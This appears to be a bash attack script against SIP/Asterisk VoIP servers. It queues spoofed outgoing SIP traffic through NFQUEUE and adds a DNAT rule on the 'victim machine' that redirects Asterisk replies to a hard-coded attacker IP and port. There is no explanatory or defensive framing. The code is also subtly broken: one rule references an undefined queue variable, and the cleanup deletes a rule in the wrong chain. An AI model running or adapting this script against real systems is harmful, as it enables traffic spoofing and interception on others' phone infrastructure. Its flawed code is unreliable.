#!/bin/bash

# Configuration variables
ATTACK_QUEUE_NUM=1
ACK_RETURN_QUEUE_NUM=2
SIP_PORT=5060
ACK_PORT=4000
SPOOFED_SUBNET="10.10.123.0/25"
ATTACKER_IP="143.53.142.93"

# Match outgoing spoofed attack traffic → destined to SIP port
sudo iptables -I OUTPUT -p udp --dport "$SIP_PORT" -j NFQUEUE --queue-num "$ATTACK_QUEUE_NUM"

# Match responses redirected to attacker port
sudo iptables -I INPUT -p udp --dport "$ACK_PORT" -j NFQUEUE --queue-num "$VICTIM_RETURN_QUEUE_NUM"

# On Victim machine - Return path
# Redirect Asterisk replies to attacker (DNAT)
sudo iptables -t nat -I OUTPUT -p udp --sport "$SIP_PORT" -d "$SPOOFED_SUBNET" -j DNAT --to-destination "$ATTACKER_IP:$ACK_PORT"

# Cleanup function
cleanup() {
    echo "[*] Cleaning up iptables rules"
    sudo iptables -D OUTPUT -p udp --dport "$SIP_PORT" -j NFQUEUE --queue-num "$ATTACK_QUEUE_NUM"
    sudo iptables -D OUTPUT -p udp --dport "$ACK_PORT" -j NFQUEUE --queue-num "$ACK_RETURN_QUEUE_NUM"
    
    # On Victim machine - Return path
    sudo iptables -t nat -D OUTPUT -p udp --sport "$SIP_PORT" -d "$SPOOFED_SUBNET" -j DNAT --to-destination "$ATTACKER_IP:$ACK_PORT"

    exit
}

trap cleanup EXIT INT TERM

echo "[*] Rules active. Press Ctrl+C to exit."
while true; do sleep 1; done
